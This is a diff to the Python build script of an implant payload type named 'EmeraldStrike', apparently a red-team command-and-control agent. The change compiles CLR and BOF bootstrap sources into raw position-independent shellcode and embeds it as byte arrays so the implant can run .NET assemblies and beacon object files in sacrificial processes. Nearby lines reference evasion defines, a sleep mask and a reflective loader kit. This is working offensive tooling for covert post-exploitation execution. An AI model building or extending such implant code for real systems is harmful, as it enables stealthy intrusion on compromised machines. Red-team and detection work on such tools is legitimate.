@@ -268,11 +268,39 @@ class EmeraldStrike(PayloadType):
                 else:
                     logger.warning("Sleepmask COFF build failed or not found; sleep will use plain Sleep()")
 
+            # Build CLR bootstrap PIC stub for fork-and-run execute_assembly
+            clr_bootstrap_define = ""
+            clr_bootstrap_bytes = await self._build_clr_bootstrap(arch, dst_path)
+            if clr_bootstrap_bytes:
+                clr_hex = ", ".join(f"0x{b:02x}" for b in clr_bootstrap_bytes)
+                clr_bootstrap_define = (
+                    f"static const unsigned char CLR_BOOTSTRAP_BYTES[] = {{ {clr_hex} }};\n"
+                    f"#define CLR_BOOTSTRAP_SIZE {len(clr_bootstrap_bytes)}"
+                )
+                logger.info(f"CLR bootstrap embedded: {len(clr_bootstrap_bytes)} bytes")
+            else:
+                logger.info("CLR bootstrap not built; fork-and-run execute_assembly disabled")
+
+            # Build BOF bootstrap PIC stub for fork-and-run inline_execute
+            bof_bootstrap_define = ""
+            bof_bootstrap_bytes = await self._build_bof_bootstrap(arch, dst_path)
+            if bof_bootstrap_bytes:
+                bof_hex = ", ".join(f"0x{b:02x}" for b in bof_bootstrap_bytes)
+                bof_bootstrap_define = (
+                    f"static const unsigned char BOF_BOOTSTRAP_BYTES[] = {{ {bof_hex} }};\n"
+                    f"#define BOF_BOOTSTRAP_SIZE {len(bof_bootstrap_bytes)}"
+                )
+                logger.info(f"BOF bootstrap embedded: {len(bof_bootstrap_bytes)} bytes")
+            else:
+                logger.info("BOF bootstrap not built; fork-and-run inline_execute disabled")
+
             config_content = config_content.replace("%TRANSPORT_DEFINE%", transport_define)
             config_content = config_content.replace("%CONFIG_BYTES%", config_hex)
             config_content = config_content.replace("%COMMAND_DEFINES%", cmd_defines_str)
             config_content = config_content.replace("%EVASION_DEFINES%", evasion_defines)
             config_content = config_content.replace("%SLEEPMASK_COFF_DEFINE%", sleepmask_coff_define)
+            config_content = config_content.replace("%CLR_BOOTSTRAP_DEFINE%", clr_bootstrap_define)
+            config_content = config_content.replace("%BOF_BOOTSTRAP_DEFINE%", bof_bootstrap_define)
 
             with open(config_h_path, "w") as f:
                 f.write(config_content)
@@ -665,6 +693,142 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 
         with open(out_path, "rb") as f:
             return f.read()
+
+    async def _build_clr_bootstrap(self, arch, build_path):
+        """Compile clr_bootstrap.cc into raw PIC shellcode for fork-and-run."""
+        src = os.path.join(build_path, "src", "evasion", "clr_bootstrap.cc")
+        if not os.path.exists(src):
+            logger.info("clr_bootstrap.cc not found, skipping")
+            return None
+
+        os.makedirs(os.path.join(build_path, "bin", "obj"), exist_ok=True)
+        obj = os.path.join(build_path, "bin", "obj", f"clr_bootstrap.{arch}.exe")
+        bin_out = os.path.join(build_path, "bin", f"clr_bootstrap.{arch}.bin")
+
+        if arch == "x64":
+            cc_parts = ["clang", "-target", "x86_64-w64-mingw32"]
+        else:
+            cc_parts = ["clang", "-target", "i686-w64-mingw32"]
+
+        # Find sysroot for cross-compilation headers (same logic as Makefile)
+        sysroot_flags = []
+        for candidate in ["/usr/x86_64-w64-mingw32", "/usr/i686-w64-mingw32",
+                          "C:/msys64/mingw64", "C:/msys64/mingw32"]:
+            if os.path.isdir(candidate):
+                sysroot_flags = [f"--sysroot={candidate}"]
+                break
+
+        compile_cmd = cc_parts + [
+            src, "-o", obj,
+            "-Os", "-nostdlib", "-fno-asynchronous-unwind-tables",
+            "-fno-ident", "-fno-builtin", "-s", "-w", "-std=c++20",
+            "-fno-exceptions", "-fno-stack-protector",
+            "-fno-function-sections", "-fno-zero-initialized-in-bss",
+            "-fpack-struct=8", "-mno-sse", "-masm=intel",
+            "-fms-extensions", "-fno-jump-tables",
+            f"-I{os.path.join(build_path, 'include')}",
+            "-e", "clr_entry",
+            "-Wl,-s,--strip-all,--enable-stdcall-fixup",
+        ] + sysroot_flags
+
+        proc = await asyncio.create_subprocess_exec(
+            *compile_cmd,
+            cwd=build_path, env=_make_env(),
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.PIPE,
+        )
+        stdout, stderr = await _run_with_timeout(proc, 60, "CLR bootstrap compile")
+        if proc.returncode != 0:
+            logger.warning(f"CLR bootstrap compile failed: {stderr.decode(errors='replace')}")
+            return None
+
+        # Extract .text section as raw PIC shellcode
+        proc2 = await asyncio.create_subprocess_exec(
+            "objcopy", "--dump-section", f".text={bin_out}", obj,
+            cwd=build_path, env=_make_env(),
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.PIPE,
+        )
+        stdout2, stderr2 = await _run_with_timeout(proc2, 30, "CLR bootstrap extract")
+        if proc2.returncode != 0 or not os.path.exists(bin_out):
+            logger.warning(f"CLR bootstrap .text extraction failed: {stderr2.decode(errors='replace')}")
+            return None
+
+        with open(bin_out, "rb") as f:
+            data = f.read()
+
+        if len(data) < 32:
+            logger.warning(f"CLR bootstrap too small ({len(data)} bytes), likely broken")
+            return None
+
+        return data
+
+    async def _build_bof_bootstrap(self, arch, build_path):
+        """Compile bof_bootstrap.cc into raw PIC shellcode for fork-and-run BOF execution."""
+        src = os.path.join(build_path, "src", "evasion", "bof_bootstrap.cc")
+        if not os.path.exists(src):
+            logger.info("bof_bootstrap.cc not found, skipping")
+            return None
+
+        os.makedirs(os.path.join(build_path, "bin", "obj"), exist_ok=True)
+        obj = os.path.join(build_path, "bin", "obj", f"bof_bootstrap.{arch}.exe")
+        bin_out = os.path.join(build_path, "bin", f"bof_bootstrap.{arch}.bin")
+
+        if arch == "x64":
+            cc_parts = ["clang", "-target", "x86_64-w64-mingw32"]
+        else:
+            cc_parts = ["clang", "-target", "i686-w64-mingw32"]
+
+        sysroot_flags = []
+        for candidate in ["/usr/x86_64-w64-mingw32", "/usr/i686-w64-mingw32",
+                          "C:/msys64/mingw64", "C:/msys64/mingw32"]:
+            if os.path.isdir(candidate):
+                sysroot_flags = [f"--sysroot={candidate}"]
+                break
+
+        compile_cmd = cc_parts + [
+            src, "-o", obj,
+            "-Os", "-nostdlib", "-fno-asynchronous-unwind-tables",
+            "-fno-ident", "-fno-builtin", "-s", "-w", "-std=c++20",
+            "-fno-exceptions", "-fno-stack-protector",
+            "-fno-function-sections", "-fno-zero-initialized-in-bss",
+            "-fpack-struct=8", "-mno-sse", "-masm=intel",
+            "-fms-extensions", "-fno-jump-tables",
+            f"-I{os.path.join(build_path, 'include')}",
+            "-e", "bof_entry",
+            "-Wl,-s,--strip-all,--enable-stdcall-fixup",
+        ] + sysroot_flags
+
+        proc = await asyncio.create_subprocess_exec(
+            *compile_cmd,
+            cwd=build_path, env=_make_env(),
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.PIPE,
+        )
+        stdout, stderr = await _run_with_timeout(proc, 60, "BOF bootstrap compile")
+        if proc.returncode != 0:
+            logger.warning(f"BOF bootstrap compile failed: {stderr.decode(errors='replace')}")
+            return None
+
+        proc2 = await asyncio.create_subprocess_exec(
+            "objcopy", "--dump-section", f".text={bin_out}", obj,
+            cwd=build_path, env=_make_env(),
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.PIPE,
+        )
+        stdout2, stderr2 = await _run_with_timeout(proc2, 30, "BOF bootstrap extract")
+        if proc2.returncode != 0 or not os.path.exists(bin_out):
+            logger.warning(f"BOF bootstrap .text extraction failed: {stderr2.decode(errors='replace')}")
+            return None
+
+        with open(bin_out, "rb") as f:
+            data = f.read()
+
+        if len(data) < 64:
+            logger.warning(f"BOF bootstrap too small ({len(data)} bytes), likely broken")
+            return None
+
+        return data
 
     async def _extract_udrl_kit(self, build_path):
         """Extract UDRL kit ZIP and return (kit_root, loader_dir, mask_dir)."""
